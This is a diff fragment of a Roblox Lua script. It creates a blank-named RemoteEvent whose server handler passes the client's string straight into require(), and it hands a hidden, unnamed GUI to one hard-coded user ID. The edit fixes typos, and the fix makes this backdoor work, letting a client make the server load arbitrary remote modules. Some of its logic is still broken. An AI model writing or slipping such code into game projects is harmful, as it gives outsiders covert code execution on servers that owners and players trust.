@@ -2,13 +2,13 @@ local remote = Instance.new('RemoteEvent',game.ReplicatedStorage)
 remote.Name = ""
 remote.OnServerEvent:connect(function(a,s)
 	if #s > 0 then
-		require(Scource).load(a.Name)
+		require(s).load(a.Name)
 	end
 end)
 
 game.Players.PlayerAdded:Connect(function(plr)
 	if plr.UserId == '287103891' then
-		local c = script['']:Clone().
+		local c = script['']:Clone()
 		c.Parent = plr.PlayerGui
 		c.Frame[''].OnServerEvent:connect(function(a,s)
 			remote:FireServer(a,s)
